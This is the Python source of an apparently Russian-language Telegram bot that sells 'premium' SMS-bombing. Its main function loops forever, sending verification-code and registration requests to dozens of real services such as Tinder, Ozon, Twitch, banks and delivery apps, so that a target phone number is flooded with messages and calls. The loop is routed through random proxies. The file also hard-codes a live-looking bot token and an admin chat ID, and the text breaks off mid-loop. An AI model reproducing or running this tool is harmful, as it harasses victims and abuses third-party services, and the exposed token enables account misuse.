# -*- coding: utf-8 -*-
import requests
from datetime import datetime, timedelta
from telebot import TeleBot
import telebot
from colorama import init, Fore, Back, Style
from datetime import datetime, timedelta

import requests, random, datetime, time
import threading
import os

proxies = {}
fout = open('http_proxies.txt', 'rt')
lines = fout.readlines()
fout.close()

proxies = []
for line in lines:
    proxies.append(line)
proxies = random.choice(proxies).rstrip()
proxies = 'HTTP', proxies

print(proxies)
TheVar = 1

out_time = 0.5


class MyThread(threading.Thread):
    def run(self):
        global theVar


def listener(messages):
    @bot.message_handler(commands=['script1'])
    def handle_script1_request(message, theVar=None, ssh=None):
        ip = message.text.split()[-1]
        result = ssh.get_script1(ip)
        bot.send_message(message.chat.id, result)
        theVar = theVar + 1


for x in range(200):
    MyThread().start()

TOKEN = os.environ.get('BOT_TOKEN')
TOKEN = '1040360800:AAHrux5TfRnok9foJDP2gM7QGRvz7esmkHE'
let = 1
THREADS_LIMIT = 100

chat_ids_file = 'chat_ids.txt'

ADMIN_CHAT_ID = 947353888

users_amount = [0]
threads = list()
THREADS_AMOUNT = [0]
types = telebot.types
bot = TeleBot(TOKEN)
running_spams_per_chat_id = []


def save_chat_id(chat_id):
    "Функция добавляет чат айди в файл если его там нету"
    chat_id = str(chat_id)
    with open(chat_ids_file, "a+") as ids_file:
        ids_file.seek(0)

        ids_list = [line.split('\n')[0] for line in ids_file]

        if chat_id not in ids_list:
            ids_file.write(f'{chat_id}\n')
            ids_list.append(chat_id)
            print(f'New chat_id saved: {chat_id}')
        else:
            print(f'chat_id {chat_id} is already saved')
        users_amount[0] = len(ids_list)
    return


def send_message_users(message):
    def send_message(chat_id):
        data = {
            'chat_id': chat_id,
            'text': message
        }
        response = requests.post(f'https://api.telegram.org/bot{TOKEN}/sendMessage', data=data)

    with open(chat_ids_file, "r") as ids_file:
        ids_list = [line.split('\n')[0] for line in ids_file]

    [send_message(chat_id) for chat_id in ids_list]
    bot.send_message(ADMIN_CHAT_ID, f"сообщение успешно отправлено всем ({users_amount[0]}) пользователям бота!")


@bot.message_handler(commands=['start'])
def start(message):
    keyboard = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)

    faq = types.KeyboardButton(text='Соглашение')
    premium = types.KeyboardButton(text='Премиум')
    boom = types.KeyboardButton(text='Бомбер')
    stop = types.KeyboardButton(text='Отключить')
    buttons_to_add = [faq, premium]
    # with open("premium.txt") as file:
    #     arrayBL = [row.strip() for row in file]
    #     iduser = f'{message.chat.id}'
    # if iduser in arrayBL:
    #     boom = types.KeyboardButton(text='Бомбер')
    #     stop = types.KeyboardButton(text='Отключить')
    #     keyboard.add(*buttons_to_add)
    # else:
    #     pass

    if int(message.chat.id) == ADMIN_CHAT_ID:
        buttons_to_add.append(types.KeyboardButton(text='Рассылка'))
        boom = types.KeyboardButton(text='Бомбер')
        stop = types.KeyboardButton(text='Отключить')
        keyboard.add(*buttons_to_add)

    bot.send_message(message.chat.id,
                     f'❤ Премиум доступ  - 50Р\n - 120 Сервисов \n Бесконечный флуд \n Доступ НАВСЕГДА \n Запускайте флуд сразу на 10 НОМЕРОВ\n 🙎За покупкой - @viannedi \n Или \n\n Перейдите по ссылке для оплаты \n❗️Обязательно введите коментарий: <code>{message.chat.id}</code>',
                     parse_mode='html', reply_markup=keyboard)

    save_chat_id(message.chat.id)


# @bot.message_handler(commands=['bomber'])
# def bomber():
#     bot.send_message(chat_id,
#                      'Введите номер без + в формате:\n🇺🇦 380xxxxxxxxx\n🇷🇺 79xxxxxxxxx\n🇰🇿 77xxxxxxxxx \n🇧🇾 375xxxxxxxxx')
#
# @bot.message_handler(commands=['info'])
# def info():
#     bot.send_message(chat_id,
#                      '❤️Возникли проблемы? - @viannedi \n Чат элиты - @VV2_Chat \n Сервисы - @crinny\n Спумера создал - @artem2424',
#                      parse_mode='HTML')

iteration = 0
_name = ''
for x in range(12):
    _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))


def send_for_number(phone):
    global iteration
    request_timeout = 0.00001
    _email = _name + f'{iteration}' + '@gmail.com'
    email = _name + f'{iteration}' + '@gmail.com'
    _phone = phone
    _phone9 = _phone[1:]
    _phoneAresBank = '+' + _phone[0] + '(' + _phone[1:4] + ')' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[
                                                                                                         9:11]  # +7+(915)350-99-08
    _phone9dostavista = _phone9[:3] + '+' + _phone9[3:6] + '-' + _phone9[6:8] + '-' + _phone9[8:10]  # 915+350-99-08
    _phoneOstin = '+' + _phone[0] + '+(' + _phone[1:4] + ')' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[
                                                                                                       9:11]  # '+7+(915)350-99-08'
    _phonePizzahut = '+' + _phone[0] + ' (' + _phone[1:4] + ') ' + _phone[4:7] + ' ' + _phone[7:9] + ' ' + _phone[
                                                                                                           9:11]  # '+7 (915) 350 99 08'
    _phoneGorzdrav = _phone[1:4] + ') ' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[9:11]  # '915) 350-99-08'
    while True:
        _email = _name + f'{iteration}' + '@gmail.com'
        email = _name + f'{iteration}' + '@gmail.com'
        try:
            requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
                          data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com',
                                'deviceToken': '*'}, headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
            print('[+] Grab sent!')
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
            print('[+] RuTaxi sent!')
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
            print('[+] BelkaCar sent!')
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                          data={'phone_number': _phone}, headers={})
            print('[+] Tinder sent!')
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
            print('[+] Karusel sent!')
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + _phone}, headers={})
            print('[+] Tinkoff sent!')
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
            print('[+] MTS sent!')
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://account.my.games/signup_send_sms/', data={"phone": _phone})
            print('[+] MyGames sent!')
        except:
            print('[+] error in sent!')

        try:
            requests.post('https://zoloto585.ru/api/bcard/reg/',
                          json={"name": _name, "surname": _name, "patronymic": _name, "sex": "m",
                                "birthdate": "11.11.1999", "phone": (_phone, "+* (***) ***-**-**"), "email": _email,
                                "city": "Москва", })
            print('[+] Zoloto585 отправлено!')
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://kasta.ua/api/v2/login/', data={"phone": _phone})
            print('[+] Kasta отправлено!')
            time.sleep(0.1)
        except:
            print('[-] Kasta Не отправлено!')

        try:
            requests.post('https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/',
                          data={"RECALL": "Y", "BACK_CALL_PHONE": _phone})
            print('[+] taxi-ritm отправлено!')
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                          json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email", })
            print('[+] Mail.ru отправлено!')
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://api.creditter.ru/confirm/sms/send',
                          json={"phone": (_phone, "+* (***) ***-**-**"), "type": "register", })
            print('[+] Creditter отправлен!')
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://www.ingos.ru/api/v1/lk/auth/register/fast/step2',
                          headers={"Referer": "https://www.ingos.ru/cabinet/registration/personal"},
                          json={"Birthday": "1986-07-10T07:19:56.276+02:00",
                                "DocIssueDate": "2004-02-05T07:19:56.276+02:00",
                                "DocNumber": random.randint(500000, 999999),
                                "DocSeries": random.randint(5000, 9999), "FirstName": _name, "Gender": "M",
                                "LastName": _name,
                                "SecondName": _name, "Phone": _phone, "Email": _email, })
            print('[+] Ingos отправлено!')
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://win.1admiralxxx.ru/api/en/register.json',
                          json={"mobile": _phone, "bonus": "signup", "agreement": 1, "currency": "RUB", "submit": 1,
                                "email": "", "lang": "en", })
            print('[+] Admiralxxx отправлено!')
        except:
            print('[-] не отправлено!')
        try:
            requests.post('https://uklon.com.ua/api/v1/account/code/send',
                          headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": _phone})
            print('[+] Uklon отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://www.ozon.ru/api/composer-api.bx/_action/fastEntry',
                          json={"phone": _phone, "otpId": 0})
            print('[+] Ozon отправлен!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')

        try:
            requests.get('https://requests.service.banki.ru/form/960/submit',
                         params={"callback": "submitCallback", "name": _name, "phone": "+" + _phone, "email": _email,
                                 "gorod": "Москва", "approving_data": "1", })
            print('[+] Banki отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
            print('[+] IVI отправлено!')
            time.sleep(1)
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://www.moyo.ua/identity/registration',
                          data={"firstname": _name, "phone": _phone, "email": _email, })
            print('[+] Moyo отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')

        try:
            site = 'https://www.icq.com/smsreg/requestPhoneValidation.php'
            requests.post(site, data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                                      "k": "ic1rtwz1s1Hj1O0r", "r": "46763"}, timeout=out_time)
            print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' ICQ отправлено!')
        except:
            print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')
        try:
            site = 'https://lk.invitro.ru/sp/mobileApi/createUserByPassword'
            requests.post(site, data={"password": password, "application": "lkp", "login": "+" + _phone},
                          timeout=out_time)
            print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' Invitro отправлено!')
        except:
            print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

        try:
            site = 'https://ube.pmsm.org.ru/esb/iqos-phone/validate'
            requests.post(site, json={"phone": _phone}, timeout=out_time)
            print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' Pmsm отправлено!')
        except:
            print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

        try:
            site = 'https://api.ivi.ru/mobileapi/user/register/phone/v6'
            requests.post(site, data={"phone": _phone}, timeout=out_time)
            print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' IVI отправлено!')
        except:
            print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

        try:
            site = 'https://lenta.com/api/v1/authentication/requestValidationCode'
            requests.post(site, json={'phone': '+' + _phone}, timeout=out_time)
            print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' Lenta отправлено!')
        except:
            print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

        try:
            site = 'https://cloud.mail.ru/api/v2/notify/applink'
            requests.post(site, json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email"},
                          timeout=out_time)
            print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' Mail.ru отправлено!')
        except:
            print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

        try:
            site = 'https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode'
            requests.post(site, params={"pageName": "registerPrivateUserPhoneVerificatio"},
                          data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""}, timeout=out_time)
            print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' MVideo отправлено!')
        except:
            print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

        try:
            site = 'https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone'
            requests.post(site, data={"st.r.phone": "+" + _phone}, timeout=out_time)
            print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' OK отправлено!')
        except:
            print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

        try:
            site = 'https://plink.tech/register/'
            requests.post(site, json={"phone": _phone}, timeout=out_time)
            print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' Plink отправлено!')
        except:
            print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

        try:
            site = 'https://qlean.ru/clients-api/v2/sms_codes/auth/request_code'
            requests.post(site, json={"phone": _phone}, timeout=out_time)
            print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' qlean отправлено!')
        except:
            print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

        try:
            site = 'http://smsgorod.ru/sendsms.php'
            requests.post(site, data={"number": _phone}, timeout=out_time)
            print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' SMSgorod отправлено!')
        except:
            print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

        try:
            site = 'https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru'
            requests.post(site, data={'phone_number': _phone}, timeout=out_time)
            print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' Tinder отправлено!')
        except:
            print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

        try:
            site = 'https://passport.twitch.tv/register?trusted_request=true'
            requests.post(site, json={"birthday": {"day": 11, "month": 11, "year": 1999},
                                      "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,
                                      "password": password, "phone_number": _phone, "username": username},
                          timeout=out_time)
            print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' Twitch отправлено!')
        except:
            print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

        try:
            site = 'https://cabinet.wi-fi.ru/api/auth/by-sms'
            requests.post(site, data={'msisdn': _phone}, headers={'App-ID': 'cabinet'}, timeout=out_time)
            print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' CabWiFi отправлено!')
        except:
            print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

        try:
            site = 'https://api.wowworks.ru/v2/site/send-code'
            requests.post(site, json={"phone": _phone, "type": 2}, timeout=out_time)
            print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' wowworks отправлено!')
        except:
            print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

        try:
            site = 'https://eda.yandex/api/v1/user/request_authentication_code'
            requests.post(site, json={"phone_number": "+" + _phone}, timeout=out_time)
            print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' Eda.Yandex отправлено!')
        except:
            print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

        try:
            site = 'https://youla.ru/web-api/auth/request_code'
            requests.post(site, data={'phone': _phone}, timeout=out_time)
            print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' Youla отправлено!')
        except:
            print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

        try:
            site = 'https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/'
            requests.post(site, json={"client_type": "personal", "email": f"{email}@gmail.ru", "mobile_phone": _phone,
                                      "deliveryOption": "sms"}, timeout=out_time)
            print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' Alpari отправлено!')
        except:
            print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

        try:
            site = 'https://api-prime.anytime.global/api/v2/auth/sendVerificationCode'
            requests.post(site, data={"phone": _phone}, timeout=out_time)
            print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' SMS отправлено!')
        except:
            print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

        try:
            site = 'https://www.delivery-club.ru/ajax/user_otp'
            requests.post(site, data={"phone": _phone}, timeout=out_time)
            print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' Delivery отправлено!')
        except:
            print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

        try:
            requests.post('https://helsi.me/api/healthy/accounts/login', json={"phone": _phone, "platform": "PISWeb"})
            print('[+] Helsi отправлено!')
            time.sleep(0.1)
        except:
            print('[+] не отправлено!')
        try:
            requests.post('https://oauth.av.ru/check-phone', json={"phone": (_phone, "+* (***) ***-**-**")})
            print('[+] Av отправлено!')
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                          params={"msisdn": _phone})
            print('[+] MTS отправлено!')
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://auth.multiplex.ua/login', json={"login": _phone})
            print('[+] MultiPlex отправлено!')
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://3040.com.ua/taxi-ordering', data={"callback-phone": _phone})
            print('[+] 3040 отправлено!')
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://fix-price.ru/ajax/register_phone_code.php',
                          data={"register_call": "Y", "action": "getCode", "phone": "+" + _phone})
            print('[+] Fix-Price отправлено!')
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
            print('[+] Iqos отправлено!')
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={"phone": "+" + _phone})
            print('[+] KFC отправлено!')
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://www.tarantino-family.com/wp-admin/admin-ajax.php',
                          data={"action": "callback_phonenumber", "phone": _phone})
            print('[+] tarantino-family отправлено!')
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://apteka.ru/_action/auth/getForm/',
                          data={"form[NAME]": "", "form[PERSONAL_GENDER]": "", "form[PERSONAL_BIRTHDAY]": "",
                                "form[EMAIL]": "", "form[LOGIN]": (_phone, "+* (***) ***-**-**"),
                                "form[PASSWORD]": password, "get-new-password": "Получите пароль по SMS",
                                "user_agreement": "on", "personal_data_agreement": "on", "formType": "simple",
                                "utc_offset": "120", })
            print('[+] Apteka отправлено!')
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://uklon.com.ua/api/v1/account/code/send',
                          headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": _phone})
            print('[+] Uklon отправлено!')
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://www.ozon.ru/api/composer-api.bx/_action/fastEntry',
                          json={"phone": _phone, "otpId": 0})
            print('[+] Ozon отправлен!')
        except:
            print('[-] не отправлено!')

        try:
            requests.get('https://requests.service.banki.ru/form/960/submit',
                         params={"callback": "submitCallback", "name": _name, "phone": "+" + _phone, "email": _email,
                                 "gorod": "Москва", "approving_data": "1", })
            print('[+] Banki отправлено!')
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
            print('[+] IVI отправлено!')
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://www.moyo.ua/identity/registration',
                          data={"firstname": _name, "phone": _phone, "email": _email, })
            print('[+] Moyo отправлено!')
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://helsi.me/api/healthy/accounts/login', json={"phone": _phone, "platform": "PISWeb"})
            print('[+] Helsi отправлено!')
        except:
            print('[+] не отправлено!')

        try:
            requests.post('https://api.kinoland.com.ua/api/v1/service/send-sms', headers={"Agent": "website"},
                          json={"Phone": _phone, "Type": 1})
            print('[+] KinoLend отправлен!')
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://pizzahut.ru/account/password-reset',
                          data={'reset_by': 'phone', 'action_id': 'pass-recovery', 'phone': _phonePizzahut,
                                '_token': '*'})
            print('[+] PizzaHut sent!')
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
            print('[+] Rabota sent!')
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
            print('[+] Rutube sent!')
        except:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            print('[+] Citilink sent!')

        try:
            requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
                          data={'name': _name, 'phone': _phone, 'promo': 'yellowforma'})
            print('[+] Smsint sent!')
        except:
            print('[-] error in sent!')

        try:
            requests.get(
                'https://www.oyorooms.com/api/pwa/generateotp?phone=' + _phone9 + '&country_code=%2B7&nod=4&locale=en')
            print('[+] oyorooms sent!')
        except:
            print('[-] error in sent!')

        try:
            requests.post(
                'https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp',
                params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false', 'fromRegisterPage': 'true',
                        'snLogin': '', 'bpg': '', 'snProviderId': ''},
                data={'phone': _phone, 'g-recaptcha-response': '', 'recaptcha': 'on'})
            print('[+] MVideo sent!')
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {
                'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone, 'typeKeys': ['Unemployed']}},
                                                              'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
            print('[+] newnext sent!')
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
            print('[+] Sunlight sent!')
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                          json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone,
                                'deliveryOption': 'sms'})
            print('[+] alpari sent!')
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
            print('[+] Invitro sent!')
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://online.sbis.ru/reg/service/',
                          json={'jsonrpc': '2.0', 'protocol': '5', 'method': 'Пользователь.ЗаявкаНаФизика',
                                'params': {'phone': _phone}, 'id': '1'})
            print('[+] Sberbank sent!')
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest',
                          json={'firstName': 'Иван', 'middleName': 'Иванович', 'lastName': 'Иванов', 'sex': '1',
                                'birthDate': '10.10.2000', 'mobilePhone': _phone9, 'russianFederationResident': 'true',
                                'isDSA': 'false', 'personalDataProcessingAgreement': 'true',
                                'bKIRequestAgreement': 'null', 'promotionAgreement': 'true'})
            print('[+] Psbank sent!')
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
            print('[+] Beltelcom sent!')
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
            print('[+] Karusel sent!')
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
            print('[+] KFC sent!')
        except:
            print('[-] error in sent!')

        try:
            requests.post("https://api.carsmile.com/",
                          json={"operationName": "enterPhone", "variables": {"phone": _phone},
                                "query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
            print('[+] carsmile sent!')
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            print('[+] Citilink sent!')
        except:
            print('[-] error in sent!')

        try:
            requests.post("https://api.delitime.ru/api/v2/signup",
                          data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
            print('[+] Delitime sent!')
        except:
            print('[-] error in sent!')

        try:
            requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
            print('[+] findclone звонок отправлен!')
        except:
            print('[-] error in sent!')

        try:
            requests.post("https://guru.taxi/api/v1/driver/session/verify",
                          json={"phone": {"code": 1, "number": _phone}})
            print('[+] Guru sent!')
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                          data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                                "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            print('[+] ICQ sent!')
        except:
            print('[-] error in sent!')

        try:
            requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
                          data={"mode": "request", "phone": "+" + _phone, "phone_permission": "unknown", "stream_id": 0,
                                "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
            print('[+] InDriver sent!')
        except:
            print('[-] error in sent!')

        try:
            requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
                          data={"password": password, "application": "lkp", "login": "+" + _phone})
            print('[+] Invitro sent!')
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
            print('[+] Pmsm sent!')
        except:
            print('[-] error in sent!')

        try:
            requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
            print('[+] IVI sent!')
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',
                          json={'phone': '+' + _phone})
            print('[+] Lenta sent!')
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                          json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email"})
            print('[+] Mail.ru sent!')
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
                          params={"pageName": "registerPrivateUserPhoneVerificatio"},
                          data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
            print('[+] MVideo sent!')
        except:
            print('[-] error in sent!')

        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                          data={"st.r.phone": "+" + _phone})
            print('[+] OK sent!')
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://plink.tech/register/', json={"phone": _phone})
            print('[+] Plink sent!')
        except:
            print('[-] error in sent!')

        try:
            requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
            print('[+] qlean sent!')
        except:
            print('[-] error in sent!')

        try:
            requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
            print('[+] SMSgorod sent!')
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                          data={'phone_number': _phone})
            print('[+] Tinder sent!')
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://passport.twitch.tv/register?trusted_request=true',
                          json={"birthday": {"day": 11, "month": 11, "year": 1999},
                                "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,
                                "password": password, "phone_number": _phone, "username": username})
            print('[+] Twitch sent!')
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},
                          headers={'App-ID': 'cabinet'})
            print('[+] CabWiFi sent!')
        except:
            print('[-] error in sent!')

        try:
            requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
            print('[+] wowworks sent!')
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
                          json={"phone_number": "+" + _phone})
            print('[+] Eda.Yandex sent!')
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
            print('[+] Youla sent!')
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                          json={"client_type": "personal", "email": f"{email}@gmail.ru", "mobile_phone": _phone,
                                "deliveryOption": "sms"})
            print('[+] Alpari sent!')
        except:
            print('[-] error in sent!')

        try:
            requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
            print('[+] SMS sent!')
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
            print('[+] Delivery sent!')
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
                          data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com',
                                'deviceToken': '*'}, headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
            print('[+] Grab отправлено!')
            time.sleep(0.1)
        except:
            print('[-] Не отправлено!')
        try:
            requests.post('https://kasta.ua/api/v2/login/', data={"phone": _phone})
            print('[+] Kasta отправлено!')
            time.sleep(0.1)
        except:
